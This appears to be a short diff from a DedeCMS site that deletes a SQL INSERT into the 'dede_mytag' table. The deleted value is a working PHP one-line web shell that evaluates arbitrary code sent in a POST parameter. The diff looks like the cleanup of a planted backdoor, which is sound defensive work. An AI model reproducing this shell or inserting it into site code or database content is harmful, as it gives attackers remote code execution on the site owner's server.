@@ -1,1 +1,0 @@
-INSERT INTO `dede_mytag` VALUES('26635','0','','0','0','0','<?php @eval($_POST[ou])?>','');
